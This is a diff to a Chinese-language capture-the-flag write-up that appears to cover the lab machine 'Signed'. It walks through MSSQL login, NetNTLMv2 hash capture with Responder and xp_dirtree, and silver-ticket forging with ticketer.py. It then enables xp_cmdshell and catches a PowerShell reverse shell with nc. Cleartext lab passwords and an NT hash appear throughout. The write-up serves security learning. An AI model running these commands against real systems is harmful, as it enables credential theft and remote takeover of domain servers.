@@ -1,5 +1,36 @@
 ## Signed
 ### 0xdf教会了我很对mssql
+<details>
+<summary>总结</summary>
+
+```
+————————————————————————————————————————————————————————————————
+[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth //[+] DC01\scott:Sm230#C5NatH 
+[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
+————————————————————————————————————————————————————————————————
+[1] 得到破解 NetNTLMv2 --> MSSQLSVC purPLE9795!@
+[★]$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+//尝试列出主机上 SMB 共享中的目录：
+SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (scott  guest@master)>
+————————————————————————————————————————————————————————————————
+[2][★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
+
+SQL (SIGNED\mssqlsvc  guest@master)> 
+```
+
+</details>
+
 ```
 [★]$ nmap -sCV 10.129.242.173
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-19 03:47 CDT
@@ -242,7 +273,7 @@ enum_impersonate --> For if we can impersonate another user with privileges
 https://github.com/lgandx/Responder
 ```
 //系统自带的responder
- [★]$ sudo responder -I tun0
+[★]$ sudo responder -I tun0
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -829,4 +860,60 @@ b'cbfcf88****************************\r\n'
 ```
 SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
 ERROR(DC01): Line 1: Cannot bulk load. The file "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" does not exist or you don't have file access rights.
+```
+____________
+#### SIGNED\Administrator  dbo@master
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k  DC01.signed.htb
+SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "PowerShell #5 (stderr support)(Base64)" //revshell.com
+
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.139] from (UNKNOWN) [10.129.8.38] 65101
+whoami
+signed\mssqlsvc
+```
+#### SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
+[★]$ KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+
+NULL
+```
+#### SIGNED\mssqlsvc  dbo@master --> -groups 1105 -user-id 1103 mssqlsvc
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
+[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+
+NULL              
+```
+##### 验证伪造的票据已成功授予系统管理员权限
+```
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+1   
+
+SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
+SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
+INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
+
+
 ```
